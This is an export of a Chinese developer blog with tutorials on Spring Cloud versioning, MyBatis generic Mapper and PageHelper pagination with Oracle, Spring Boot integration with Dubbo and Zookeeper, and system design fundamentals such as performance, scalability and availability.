spring-cloud-cli 1.4.1.RELEASE 2.0.0.RC1 2.0.0.BUILD-SNAPSHOT spring-cloud-commons 1.3.3.RELEASE 2.0.0.RC1 2.0.0.BUILD-SNAPSHOT spring-cloud-contract 1.2.4.RELEASE 2.0.0.RC1 2.0.0.BUILD-SNAPSHOT spring-cloud-config 1.4.3.RELEASE 2.0.0.RC1 2.0.0.BUILD-SNAPSHOT spring-cloud-netflix 1.4.4.RELEASE 2.0.0.RC1 2.0.0.BUILD-SNAPSHOT spring-cloud-security 1.2.2.RELEASE 2.0.0.RC1 2.0.0.BUILD-SNAPSHOT spring-cloud-cloudfoundry 1.1.1.RELEASE 2.0.0.RC1 2.0.0.BUILD-SNAPSHOT spring-cloud-consul 1.3.3.RELEASE 2.0.0.RC1 2.0.0.BUILD-SNAPSHOT spring-cloud-sleuth 1.3.3.RELEASE 2.0.0.RC1 2.0.0.BUILD-SNAPSHOT spring-cloud-stream Ditmars.SR3 Elmhurst.RELEASE Elmhurst.BUILD-SNAPSHOT spring-cloud-zookeeper 1.2.1.RELEASE 2.0.0.RC1 2.0.0.BUILD-SNAPSHOT spring-boot 1.5.10.RELEASE 2.0.1.RELEASE 2.0.0.BUILD-SNAPSHOT spring-cloud-task 1.2.2.RELEASE 2.0.0.RC1 2.0.0.RELEASE spring-cloud-vault 1.1.0.RELEASE 2.0.0.RC1 2.0.0.BUILD-SNAPSHOT spring-cloud-gateway 1.0.1.RELEASE 2.0.0.RC1 2.0.0.BUILD-SNAPSHOT spring-cloud-openfeign 2.0.0.RC1 2.0.0.BUILD-SNAPSHOT Finchley使用Spring Boot 2.0.x构建，不建议与Spring Boot 1.5.x一起使用。 Dalston和Edgware发行版建立在Spring Boot 1.5.x之上，不建议与Spring Boot 2.0.x一起使用。]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
        <tag>微服务</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mybatis通用Mapper和PageHelper]]></title>
    <url>%2F2019%2F03%2F01%2FMybatis%E9%80%9A%E7%94%A8Mapper%E5%92%8CPageHelper%2F</url>
    <content type="text"><![CDATA[如果项目中使用到了MyBatis框架，那么使用通用Mapper和PageHelper分页插件将极大的简化我们的操作。通用Mapper可以简化对单表的CRUD操作，PageHelper分页插件可以帮我们自动拼接分页SQL，并且可以使用MyBatis Geneator来自动生成实体类，Mapper接口和Mapper xml代码，非常的方便。 引入依赖这里使用Spring Boot来构建，搭建一个Spring boot + MyBatis的框架，然后在pom中引入： 123456789101112131415161718&lt;!-- mybatis --&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.3.1&lt;/version&gt;&lt;/dependency&gt;&lt;!-- 通用mapper --&gt;&lt;dependency&gt; &lt;groupId&gt;tk.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mapper-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.5&lt;/version&gt;&lt;/dependency&gt;&lt;!-- pagehelper 分页插件 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt; &lt;artifactId&gt;pagehelper-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.2.3&lt;/version&gt;&lt;/dependency&gt; 接着在pom中配置MyBatis Geneator： 123456789101112131415161718192021222324252627282930313233343536373839&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.3.5&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;!-- 数据库连接驱动 --&gt; &lt;groupId&gt;com.oracle&lt;/groupId&gt; &lt;artifactId&gt;ojdbc6&lt;/artifactId&gt; &lt;version&gt;6.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;tk.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mapper&lt;/artifactId&gt; &lt;version&gt;3.4.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;Generate MyBatis Artifacts&lt;/id&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;generate&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt; &lt;!--允许移动生成的文件 --&gt; &lt;verbose&gt;true&lt;/verbose&gt; &lt;!-- 是否覆盖 --&gt; &lt;overwrite&gt;true&lt;/overwrite&gt; &lt;!-- 自动生成的配置 --&gt; &lt;configurationFile&gt;src/main/resources/mybatis-generator.xml&lt;/configurationFile&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; src/main/resources/mybatis-generator.xml为生成器的配置，下文会介绍到。 配置插件在Spring Boot配置文件application.yml中配置MyBatis： 1234567mybatis: # type-aliases扫描路径 type-aliases-package: com.springboot.bean # mapper xml实现扫描路径 mapper-locations: classpath:mapper/*.xml property: order: BEFORE 接下来开始配置插件。 配置通用Mapper在Spring Boot配置文件application.yml中配置通用Mapper： 12345#mappers 多个接口时逗号隔开mapper: mappers: com.springboot.config.MyMapper not-empty: false identity: oracle 除此之外，我们需要定义一个MyMapper接口： 123456import tk.mybatis.mapper.common.Mapper;import tk.mybatis.mapper.common.MySqlMapper;public interface MyMapper&lt;T&gt; extends Mapper&lt;T&gt;, MySqlMapper&lt;T&gt; &#123; &#125; 值得注意的是，该接口不能被扫描到，应该和自己定义的Mapper分开。自己定义的Mapper都需要继承这个接口。 配置PageHelper在Spring Boot配置文件application.yml中配置通用配置PageHelper： 123456#pagehelperpagehelper: helperDialect: oracle reasonable: true supportMethodsArguments: true params: count=countSql 参数相关说明参考https://github.com/pagehelper/Mybatis-PageHelper/blob/master/wikis/zh/HowToUse.md中的分页插件参数介绍。 配置Geneator*在路径src/main/resources/下新建mybatis-generator.xml： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE generatorConfiguration PUBLIC &quot;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;&gt;&lt;generatorConfiguration&gt; &lt;context id=&quot;oracle&quot; targetRuntime=&quot;MyBatis3Simple&quot; defaultModelType=&quot;flat&quot;&gt; &lt;plugin type=&quot;tk.mybatis.mapper.generator.MapperPlugin&quot;&gt; &lt;!-- 该配置会使生产的Mapper自动继承MyMapper --&gt; &lt;property name=&quot;mappers&quot; value=&quot;com.springboot.config.MyMapper&quot; /&gt; &lt;!-- caseSensitive默认false，当数据库表名区分大小写时，可以将该属性设置为true --&gt; &lt;property name=&quot;caseSensitive&quot; value=&quot;false&quot;/&gt; &lt;/plugin&gt; &lt;!-- 阻止生成自动注释 --&gt; &lt;commentGenerator&gt; &lt;property name=&quot;javaFileEncoding&quot; value=&quot;UTF-8&quot;/&gt; &lt;property name=&quot;suppressDate&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;suppressAllComments&quot; value=&quot;true&quot;/&gt; &lt;/commentGenerator&gt; &lt;!-- 数据库链接地址账号密码 --&gt; &lt;jdbcConnection driverClass=&quot;oracle.jdbc.driver.OracleDriver&quot; connectionURL=&quot;jdbc:oracle:thin:@localhost:1521:ORCL&quot; userId=&quot;scott&quot; password=&quot;6742530&quot;&gt; &lt;/jdbcConnection&gt; &lt;javaTypeResolver&gt; &lt;property name=&quot;forceBigDecimals&quot; value=&quot;false&quot;/&gt; &lt;/javaTypeResolver&gt; &lt;!-- 生成Model类存放位置 --&gt; &lt;javaModelGenerator targetPackage=&quot;com.springboot.bean&quot; targetProject=&quot;src/main/java&quot;&gt; &lt;property name=&quot;enableSubPackages&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;trimStrings&quot; value=&quot;true&quot;/&gt; &lt;/javaModelGenerator&gt; &lt;!-- 生成映射文件存放位置 --&gt; &lt;sqlMapGenerator targetPackage=&quot;mapper&quot; targetProject=&quot;src/main/resources&quot;&gt; &lt;property name=&quot;enableSubPackages&quot; value=&quot;true&quot;/&gt; &lt;/sqlMapGenerator&gt; &lt;!-- 生成Dao类存放位置 --&gt; &lt;!-- 客户端代码，生成易于使用的针对Model对象和XML配置文件的代码 type=&quot;ANNOTATEDMAPPER&quot;,生成Java Model 和基于注解的Mapper对象 type=&quot;XMLMAPPER&quot;,生成SQLMap XML文件和独立的Mapper接口 --&gt; &lt;javaClientGenerator type=&quot;XMLMAPPER&quot; targetPackage=&quot;com.springboot.mapper&quot; targetProject=&quot;src/main/java&quot;&gt; &lt;property name=&quot;enableSubPackages&quot; value=&quot;true&quot;/&gt; &lt;/javaClientGenerator&gt; &lt;!-- 配置需要生成的表 --&gt; &lt;table tableName=&quot;T_USER&quot; domainObjectName=&quot;User&quot; enableCountByExample=&quot;false&quot; enableUpdateByExample=&quot;false&quot; enableDeleteByExample=&quot;false&quot; enableSelectByExample=&quot;false&quot; selectByExampleQueryId=&quot;false&quot;&gt; &lt;generatedKey column=&quot;id&quot; sqlStatement=&quot;oralce&quot; identity=&quot;true&quot;/&gt; &lt;/table&gt; &lt;/context&gt;&lt;/generatorConfiguration&gt; 代码生成配置好MyBatis Geneator后，在eclipse中运行命令mybatis-generator:generate： 以下为自动成成的代码： User： 123456789101112131415161718192021@Table(name = &quot;T_USER&quot;)public class User &#123; @Id @Column(name = &quot;ID&quot;) @GeneratedValue(strategy = GenerationType.IDENTITY) private Long id; @Column(name = &quot;USERNAME&quot;) private String username; @Column(name = &quot;PASSWD&quot;) private String passwd; @Column(name = &quot;CREATE_TIME&quot;) private Date createTime; @Column(name = &quot;STATUS&quot;) private String status; ...&#125; 因为这里数据库试用的是Oracle，其没有主键自动自增的功能，这里先将@GeneratedValue(strategy = GenerationType.IDENTITY)去掉，主键的生成下面会介绍到。生成的主键是BigDecimal类型的，我们将其改为Long类型。 UserMapper： 12345import com.springboot.bean.User;import com.springboot.config.MyMapper;public interface UserMapper extends MyMapper&lt;User&gt; &#123;&#125; UserMapper.xml： 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.springboot.mapper.UserMapper&quot;&gt; &lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.springboot.bean.User&quot;&gt; &lt;!-- WARNING - @mbg.generated --&gt; &lt;id column=&quot;ID&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;id&quot; /&gt; &lt;result column=&quot;USERNAME&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;username&quot; /&gt; &lt;result column=&quot;PASSWD&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;passwd&quot; /&gt; &lt;result column=&quot;CREATE_TIME&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createTime&quot; /&gt; &lt;result column=&quot;STATUS&quot; jdbcType=&quot;CHAR&quot; property=&quot;status&quot; /&gt; &lt;/resultMap&gt;&lt;/mapper&gt; 极其方便的说！ Mapper要让Spring Boot扫描到Mapper接口，需要在Spring Boot入口类中加入@MapperScan(&quot;com.springboot.mapper&quot;)注解。 为了获取到Oracle 中序列的值，我们定义一个SeqenceMapper接口： 1234public interface SeqenceMapper &#123; @Select(&quot;select $&#123;seqName&#125;.nextval from dual&quot;) Long getSequence(@Param(&quot;seqName&quot;) String seqName);&#125; 因为这里仅介绍Mapper自带的CRUD方法，所以UserMapper接口中无需定义任何方法。 通用Service我们可以定义一个通用的Service，在其中定义一些通用的方法： IService： 12345678910111213141516171819@Servicepublic interface IService&lt;T&gt; &#123; Long getSequence(@Param(&quot;seqName&quot;) String seqName); List&lt;T&gt; selectAll(); T selectByKey(Object key); int save(T entity); int delete(Object key); int updateAll(T entity); int updateNotNull(T entity); List&lt;T&gt; selectByExample(Object example);&#125; 其实现类BaseService： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public abstract class BaseService&lt;T&gt; implements IService&lt;T&gt; &#123; @Autowired protected Mapper&lt;T&gt; mapper; @Autowired protected SeqenceMapper seqenceMapper; public Mapper&lt;T&gt; getMapper() &#123; return mapper; &#125; @Override public Long getSequence(@Param(&quot;seqName&quot;) String seqName)&#123; return seqenceMapper.getSequence(seqName); &#125; @Override public List&lt;T&gt; selectAll() &#123; //说明：查询所有数据 return mapper.selectAll(); &#125; @Override public T selectByKey(Object key) &#123; //说明：根据主键字段进行查询，方法参数必须包含完整的主键属性，查询条件使用等号 return mapper.selectByPrimaryKey(key); &#125; @Override public int save(T entity) &#123; //说明：保存一个实体，null的属性也会保存，不会使用数据库默认值 return mapper.insert(entity); &#125; @Override public int delete(Object key) &#123; //说明：根据主键字段进行删除，方法参数必须包含完整的主键属性 return mapper.deleteByPrimaryKey(key); &#125; @Override public int updateAll(T entity) &#123; //说明：根据主键更新实体全部字段，null值会被更新 return mapper.updateByPrimaryKey(entity); &#125; @Override public int updateNotNull(T entity) &#123; //根据主键更新属性不为null的值 return mapper.updateByPrimaryKeySelective(entity); &#125; @Override public List&lt;T&gt; selectByExample(Object example) &#123; //说明：根据Example条件进行查询 //重点：这个查询支持通过Example类指定查询列，通过selectProperties方法指定查询列 return mapper.selectByExample(example); &#125;&#125; 接下来让UserService接口继承IService接口： 123public interface UserService extends IService&lt;User&gt;&#123; &#125; 其实现类UserServiceImpl： 1234@Repository(&quot;userService&quot;)public class UserServiceImpl extends BaseService&lt;User&gt; implements UserService&#123; &#125; 这样即可在UserService中使用BaseService中的通用方法了。 测试测试插入： 1234567891011121314151617@RunWith(SpringJUnit4ClassRunner.class)@SpringBootTest(classes = Application.class)public class ApplicationTest &#123; @Autowired private UserService userService; @Test public void test() throws Exception &#123; User user = new User(); user.setId(userService.getSequence(&quot;seq_user&quot;)); user.setUsername(&quot;scott&quot;); user.setPasswd(&quot;ac089b11709f9b9e9980e7c497268dfa&quot;); user.setCreateTime(new Date()); user.setStatus(&quot;0&quot;); this.userService.save(user); &#125;&#125; 运行代码，查看数据库： 测试查询： 1234567891011121314151617Example example = new Example(User.class);example.createCriteria().andCondition(&quot;username like &apos;%i%&apos;&quot;);example.setOrderByClause(&quot;id desc&quot;);List&lt;User&gt; userList = this.userService.selectByExample(example);for (User u : userList) &#123; System.out.println(u.getUsername());&#125;List&lt;User&gt; all = this.userService.selectAll();for (User u : all) &#123; System.out.println(u.getUsername());&#125;User user = new User();user.setId(1l);user = this.userService.selectByKey(user);System.out.println(user.getUsername()); 测试删除： 123User user = new User();user.setId(4l);this.userService.delete(user); 分页测试，从第二页开始，每页2条数据： 1234567PageHelper.startPage(2, 2);List&lt;User&gt; list = userService.selectAll();PageInfo&lt;User&gt; pageInfo = new PageInfo&lt;User&gt;(list);List&lt;User&gt; result = pageInfo.getList();for (User u : result) &#123; System.out.println(u.getUsername());&#125; 查看日志打印出的SQL： 12342017-12-28 10:25:14.033 DEBUG 11116 --- [main] c.s.mapper.UserMapper.selectAll : ==&gt; Preparing: SELECT * FROM ( SELECT TMP_PAGE.*, ROWNUM ROW_ID FROM ( SELECT ID,USERNAME,PASSWD,CREATE_TIME,STATUS FROM T_USER ) TMP_PAGE WHERE ROWNUM &lt;= ? ) WHERE ROW_ID &gt; ? 2017-12-28 10:25:14.068 DEBUG 11116 --- [main] c.s.mapper.UserMapper.selectAll : ==&gt; Parameters: 4(Integer), 2(Integer)2017-12-28 10:25:14.073 DEBUG 11116 --- [main] c.s.mapper.UserMapper.selectAll : &lt;== Total: 2 插件已经帮我自动拼接好了。]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>Mapper</tag>
        <tag>PageHelper</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Springboot整合Dubbo和Zookeeper]]></title>
    <url>%2F2019%2F03%2F01%2FSpringboot%E6%95%B4%E5%90%88Dubbo%E5%92%8CZookeeper%2F</url>
    <content type="text"><![CDATA[Dubbo是一款由阿里巴巴开发的远程服务调用框架（RPC），其可以透明化的调用远程服务，就像调用本地服务一样简单。截至目前，Dubbo发布了基于Spring Boot构建的版本，版本号为0.2.0，这使得其与Spring Boot项目整合变得更为简单方便。而Zookeeper在这里充当的是服务注册中心的角色，我们将各个微服务提供的服务通过Dubbo注册到Zookeeper中，然后服务消费者通过Dubbo从Zookeeper中获取相应服务并消费。本文案例的架构图可以简单用下图表示： 本文案例最终项目结构如下图所示： 项目采用Maven构建，各模块的作用： 模块 描述 common-api 统一定义接口，供其余子模块引用 server-provider 服务提供者，实现common-api模块中的接口，然后暴露到Zookeeper中，供服务消费者使用 server-consumer 服务消费者，通过Dubbo从Zookeeper中获取服务并消费 环境准备Zookeeper安装在搭建项目之前需要启动Zookeeper服务，Zookeeper下载地址：http://zookeeper.apache.org/releases.html#download。 下载后解压，将config目录下的zoo_sample.cfg重命名为zoo.cfg(Zookeeper配置文件，默认端口为2181，可根据实际进行修改)。然后双击bin目录下的zkServer.cmd启动即可。 构建父模块新建一个Maven项目，groupId为cc.mrbird，artifactId为dubbo-boot，packaging指定为pom。然后引入Spring Boot，dubbo-spring-boot-starter和Zookeeper相关依赖： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;cc.mrbird&lt;/groupId&gt; &lt;artifactId&gt;dubbo-boot&lt;/artifactId&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;name&gt;dubbo-boot&lt;/name&gt; &lt;description&gt;Spring Boot-Dubbo-ZooKeeper&lt;/description&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.4.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;/parent&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;project.version&gt;1.0&lt;/project.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- dubbo --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.boot&lt;/groupId&gt; &lt;artifactId&gt;dubbo-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;0.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;!-- zookeeper --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt; &lt;artifactId&gt;zookeeper&lt;/artifactId&gt; &lt;version&gt;3.4.8&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.101tec&lt;/groupId&gt; &lt;artifactId&gt;zkclient&lt;/artifactId&gt; &lt;version&gt;0.10&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;$&#123;java.version&#125;&lt;/source&gt; &lt;target&gt;$&#123;java.version&#125;&lt;/target&gt; &lt;encoding&gt;$&#123;project.build.sourceEncoding&#125;&lt;/encoding&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 构建Common-api新建一个Maven模块，artifactId为common-api，目录结构如下所示： pom.xml： 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;parent&gt; &lt;artifactId&gt;dubbo-boot&lt;/artifactId&gt; &lt;groupId&gt;cc.mrbird&lt;/groupId&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;/parent&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;artifactId&gt;common-api&lt;/artifactId&gt;&lt;/project&gt; 项目只包含一个HelloService接口： 12345package cc.mrbird.common.api;public interface HelloService &#123; String hello(String message);&#125; 至此我们可以开始构建服务提供者和服务消费者了。 构建Server-Provider新建一个Maven模块，用于暴露Dubbo服务，artifactId为server-provider，目录结构如下所示： pom内容如下： 123456789101112131415161718192021&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;parent&gt; &lt;artifactId&gt;dubbo-boot&lt;/artifactId&gt; &lt;groupId&gt;cc.mrbird&lt;/groupId&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;/parent&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;artifactId&gt;server-provider&lt;/artifactId&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;cc.mrbird&lt;/groupId&gt; &lt;artifactId&gt;common-api&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 这里我们引入了common-api模块，用于后续实现相应的服务。 在Spring Boot启动类中我们加入@EnableDubbo注解，表示要开启dubbo功能: 123456789101112import com.alibaba.dubbo.config.spring.context.annotation.EnableDubbo;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;@EnableDubbo@SpringBootApplicationpublic class ProviderApplicaiton &#123; public static void main(String[] args) &#123; SpringApplication.run(ProviderApplicaiton.class, args); System.out.println(&quot;complete&quot;); &#125;&#125; 接着在applicaiton.yml中配置Dubbo： 12345678910111213141516server: port: 8080dubbo: application: # 服务名称，保持唯一 name: server-provider # zookeeper地址，用于向其注册服务 registry: address: zookeeper://127.0.0.1:2181 #暴露服务方式 protocol: # dubbo协议，固定写法 name: dubbo # 暴露服务端口 （默认是20880，不同的服务提供者端口不能重复） port: 20880 如果Zookeeper是集群的话，spring.dubbo.registry.address配置为： 1234spring: dubbo: registry: address: zookeeper://127.0.0.1:2181?backup=127.0.0.1:2180,127.0.0.1:2182 接下来我们在cc.mrbird.provider.service路径下创建一个HelloService接口的实现类： 123456789101112import cc.mrbird.common.api.HelloService;import com.alibaba.dubbo.config.annotation.Service;import org.springframework.stereotype.Component;@Service(interfaceClass = HelloService.class)@Componentpublic class HelloServiceImpl implements HelloService &#123; @Override public String hello(String message) &#123; return &quot;hello,&quot; + message; &#125;&#125; 值得注意的是@Service注解为Dubbo提供的com.alibaba.dubbo.config.annotation.Service，而非Spring的那个。其中interfaceClass是指要发布服务的接口。 通过上面的配置，我们已经将HelloService接口的实现暴露到Zookeeper中了，接下来我们继续创建一个服务消费者，来消费这个服务。 搭建Server-Consumer新建一个Maven模块，用于消费Dubbo服务，artifactId为server-consumer，目录结构如下所示： pom内容如下： 123456789101112131415161718192021&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;parent&gt; &lt;artifactId&gt;dubbo-boot&lt;/artifactId&gt; &lt;groupId&gt;cc.mrbird&lt;/groupId&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;/parent&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;artifactId&gt;server-consumer&lt;/artifactId&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;cc.mrbird&lt;/groupId&gt; &lt;artifactId&gt;common-api&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 同样的，我们也在Spring Boot启动类中我们加入@EnableDubbo注解，表示要开启dubbo功能。 接着在applicaiton.yml中配置Dubbo： 12345678910111213server: port: 8081dubbo: application: # 服务名称，保持唯一 name: server-consumer # zookeeper地址，用于从中获取注册的服务 registry: address: zookeeper://127.0.0.1:2181 protocol: # dubbo协议，固定写法 name: dubbo 同服务提供者，我们需要指定Zookeeper的地址，协议为dubbo。 接着我们定义一个TestController，演示服务消费： 1234567891011121314151617import cc.mrbird.common.api.HelloService;import com.alibaba.dubbo.config.annotation.Reference;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class HelloController &#123; @Reference private HelloService helloService; @GetMapping(&quot;/hello/&#123;message&#125;&quot;) public String hello(@PathVariable String message) &#123; return this.helloService.hello(message); &#125;&#125; 通过Dubbo的@Reference注解注入需要使用的interface，类似于Spring的@Autowired。 测试分别启动Server-Provider和Server-Consumer，访问http://localhost:8081/hello/mrbird： 说明远程服务调用已经成功。 这里只是通过Spring Boot和Dubbo的整合来简单了解Dubbo的使用，仅作抛砖引玉，更为详细的Dubbo配置可以查看官方文档：http://dubbo.apache.org/zh-cn/docs/user/quick-start.html]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>Dubbo</tag>
        <tag>Zookeeper</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[系统设计基础]]></title>
    <url>%2F2019%2F02%2F11%2F%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[一、性能性能指标1. 响应时间指某个请求从发出到接收到响应消耗的时间。 在对响应时间进行测试时，通常采用重复请求方式，然后计算平均响应时间。 2. 吞吐量指系统在单位时间内可以处理的请求数量，通常使用每秒的请求数来衡量。 3. 并发用户数指系统能同时处理的并发用户请求数量。 在没有并发存在的系统中，请求被顺序执行，此时响应时间为吞吐量的倒数。例如系统支持的吞吐量为 100 req/s，那么平均响应时间应该为 0.01s。 目前的大型系统都支持多线程来处理并发请求，多线程能够提高吞吐量以及缩短响应时间，主要有两个原因： 多 CPU IO 等待时间 使用 IO 多路复用等方式，系统在等待一个 IO 操作完成的这段时间内不需要被阻塞，可以去处理其它请求。通过将这个等待时间利用起来，使得 CPU 利用率大大提高。 并发用户数不是越高越好，因为如果并发用户数太高，系统来不及处理这么多的请求，会使得过多的请求需要等待，那么响应时间就会大大提高。 性能优化1. 集群将多台服务器组成集群，使用负载均衡将请求转发到集群中，避免单一服务器的负载压力过大导致性能降低。 2. 缓存缓存能够提高性能的原因如下： 缓存数据通常位于内存等介质中，这种介质对于读操作特别快； 缓存数据可以位于靠近用户的地理位置上； 可以将计算结果进行缓存，从而避免重复计算。 3. 异步某些流程可以将操作转换为消息，将消息发送到消息队列之后立即返回，之后这个操作会被异步处理。 二、伸缩性指不断向集群中添加服务器来缓解不断上升的用户并发访问压力和不断增长的数据存储需求。 伸缩性与性能如果系统存在性能问题，那么单个用户的请求总是很慢的； 如果系统存在伸缩性问题，那么单个用户的请求可能会很快，但是在并发数很高的情况下系统会很慢。 实现伸缩性应用服务器只要不具有状态，那么就可以很容易地通过负载均衡器向集群中添加新的服务器。 关系型数据库的伸缩性通过 Sharding 来实现，将数据按一定的规则分布到不同的节点上，从而解决单台存储服务器的存储空间限制。 对于非关系型数据库，它们天生就是为海量数据而诞生，对伸缩性的支持特别好。 三、扩展性指的是添加新功能时对现有系统的其它应用无影响，这就要求不同应用具备低耦合的特点。 实现可扩展主要有两种方式： 使用消息队列进行解耦，应用之间通过消息传递进行通信； 使用分布式服务将业务和可复用的服务分离开来，业务使用分布式服务框架调用可复用的服务。新增的产品可以通过调用可复用的服务来实现业务逻辑，对其它产品没有影响。 四、可用性冗余保证高可用的主要手段是使用冗余，当某个服务器故障时就请求其它服务器。 应用服务器的冗余比较容易实现，只要保证应用服务器不具有状态，那么某个应用服务器故障时，负载均衡器将该应用服务器原先的用户请求转发到另一个应用服务器上，不会对用户有任何影响。 存储服务器的冗余需要使用主从复制来实现，当主服务器故障时，需要提升从服务器为主服务器，这个过程称为切换。 监控对 CPU、内存、磁盘、网络等系统负载信息进行监控，当某个数据达到一定阈值时通知运维人员，从而在系统发生故障之前及时发现问题。 服务降级服务降级是系统为了应对大量的请求，主动关闭部分功能，从而保证核心功能可用。 